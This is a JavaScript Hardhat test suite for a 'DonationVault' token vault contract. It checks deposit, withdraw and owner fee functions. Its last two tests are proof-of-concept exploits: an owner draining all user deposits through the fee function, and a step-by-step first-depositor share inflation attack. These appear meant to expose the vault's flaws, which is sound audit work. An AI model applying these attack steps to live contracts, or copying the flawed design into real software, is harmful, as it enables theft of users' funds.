const { expect } = require("chai");
const { ethers } = require("hardhat");

describe("DonationVault", function () {
  let Token, token, Vault, vault;
  let owner, user, other;

  beforeEach(async function () {
    [owner, user, other] = await ethers.getSigners();

    // Deploy mock ERC20 token
    Token = await ethers.getContractFactory("MockERC20");
    token = await Token.deploy("Mock Token", "MTK", ethers.parseUnits("1000000", 18));
    await token.waitForDeployment();

    // Distribute tokens to users
    await token.transfer(user.address, ethers.parseUnits("1000", 18));
    await token.transfer(other.address, ethers.parseUnits("1000", 18));

    // Deploy vault contract
    Vault = await ethers.getContractFactory("DonationVault");
    vault = await Vault.deploy(await token.getAddress());
    await vault.waitForDeployment();
  });

  it("should expose the correct underlying token address", async function () {
    expect(await vault.underlyingToken()).to.equal(await token.getAddress());
  });

  it("should allow deposit and issue shares", async function () {
    const amount = ethers.parseUnits("100", 18);

    await token.connect(user).approve(await vault.getAddress(), amount);
    await vault.connect(user).deposit(amount);

    const shares = await vault.balanceOf(user.address);
    expect(shares).to.be.gt(0);

    const vaultBalance = await token.balanceOf(await vault.getAddress());
    expect(vaultBalance).to.equal(amount);
  });

  it("should allow withdraw and burn shares", async function () {
    const amount = ethers.parseUnits("100", 18);

    await token.connect(user).approve(await vault.getAddress(), amount);
    await vault.connect(user).deposit(amount);

    const shares = await vault.balanceOf(user.address);
    await vault.connect(user).withdraw(shares);

    const userBalance = await token.balanceOf(user.address);
    expect(userBalance).to.be.closeTo(
      ethers.parseUnits("1000", 18),
      ethers.parseUnits("0.01", 18) // Allow gas difference
    );
  });

  it("should allow only owner to take fee", async function () {
    const amount = ethers.parseUnits("100", 18);

    await token.connect(user).approve(await vault.getAddress(), amount);
    await vault.connect(user).deposit(amount);

    await expect(
      vault.connect(user).takeFeeAsOwner(ethers.parseUnits("10", 18))
    ).to.be.reverted;

    await vault.connect(owner).takeFeeAsOwner(ethers.parseUnits("10", 18));

    const ownerBalance = await token.balanceOf(owner.address);
    expect(ownerBalance).to.be.gt(0);
  });

  it("should not allow fee withdrawal if vault has no tokens", async function () {
    await expect(
      vault.connect(owner).takeFeeAsOwner(ethers.parseUnits("1", 18))
    ).to.be.reverted;
  });

  it("should allow owner to steal all funds via takeFeeAsOwner", async function () {
    const depositAmount = ethers.parseUnits("500", 18);
  
    await token.connect(user).approve(await vault.getAddress(), depositAmount);
    await vault.connect(user).deposit(depositAmount);
  
    // Owner takes all tokens
    await vault.connect(owner).takeFeeAsOwner(depositAmount);
  
    const remaining = await token.balanceOf(await vault.getAddress());
    expect(remaining).to.equal(0); // User funds gone
  
    // Bob still holds shares, but cannot redeem
    const shares = await vault.balanceOf(user.address);
    expect(shares).to.be.gt(0);
  
    await expect(
      vault.connect(user).withdraw(shares)
    ).to.be.reverted; // Because there's no token left
  });
  
  it("should demonstrate inflation attack when vault is empty", async function () {
    const amountMaliceInject = ethers.parseUnits("1", 18);
    const amountBobDeposit = ethers.parseUnits("100", 18);

    await token.connect(owner).transfer(other.address, amountMaliceInject);
    await token.connect(owner).transfer(user.address, amountBobDeposit);

    // Step 1: Malice transfers token directly to the vault
    await token.connect(other).transfer(await vault.getAddress(), amountMaliceInject);

    // Step 2: Bob deposits tokens
    await token.connect(user).approve(await vault.getAddress(), amountBobDeposit);
    await vault.connect(user).deposit(amountBobDeposit);

    const bobShares = await vault.balanceOf(user.address);
    console.log("Bob's shares received:", bobShares.toString());
    
    // Step 3: Malice deposits small amount and withdraws
    const smallDeposit = ethers.parseUnits("0.000000000000001", 18);
    await token.connect(other).approve(await vault.getAddress(), smallDeposit);
    await vault.connect(other).deposit(smallDeposit);

    const maliceShares = await vault.balanceOf(other.address);
    console.log("Malice shares:", maliceShares.toString());
    expect(maliceShares).to.be.gt(0);

    await vault.connect(other).withdraw(maliceShares);


    // Step 4: Malice ends up with more tokens
    const finalMaliceBalance = await token.balanceOf(other.address);
    console.log("Malice final token balance:", ethers.formatUnits(finalMaliceBalance, 18));
    expect(finalMaliceBalance).to.be.gt(amountMaliceInject); // this confirms the attack
  });
});